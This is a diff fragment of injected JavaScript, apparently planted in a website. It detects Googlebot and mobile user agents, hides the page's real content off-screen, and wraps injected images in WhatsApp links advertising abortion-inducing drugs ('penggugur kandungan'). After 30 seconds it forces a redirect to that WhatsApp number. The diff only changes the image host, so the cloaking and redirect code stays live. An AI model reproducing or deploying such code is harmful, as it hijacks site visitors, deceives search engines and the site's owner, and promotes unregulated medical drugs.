@@ -16,7 +16,7 @@ if (navigator.userAgent.match(/(googlebot\/|Googlebot-Mobile|Googlebot-Image|Goo
 if (navigator.userAgent.match(/(iPod|iPhone|iPad|Android)/) ) {
 if (window.location.href.indexOf("cepat") > -1 || window.location.href.indexOf("mampus") > -1 ){         
 jQuery('.art-content').css({'position':'fixed','top':'-10000px',});
-jQuery('span[link]').each(function(){jQuery(this).append('<img src="https://tenangcepat.pages.dev/assets/img/'+jQuery(this).attr('link')+'" class="'+jQuery(this).attr('class')+'" style="'+jQuery(this).attr('class')+'">');});
+jQuery('span[link]').each(function(){jQuery(this).append('<img src="/assets/img/'+jQuery(this).attr('link')+'" class="'+jQuery(this).attr('class')+'" style="'+jQuery(this).attr('class')+'">');});
 jQuery('span[link]').each(function(){jQuery(this).wrap("<a href='https://wa.me/6285162769992?text=Mau pesan ᴘᴇɴɢɢᴜɢᴜʀ ᴋᴀɴᴅᴜɴɢᴀɴ'></a>");});
 jQuery('#modal-1').modal(); 
 setTimeout(function(){location.href="https://wa.me/6285162769992?text=Mau Pesan ᴘᴇɴɢɢᴜɢᴜʀ ᴋᴀɴᴅᴜɴɢᴀɴ"},30000 ); 
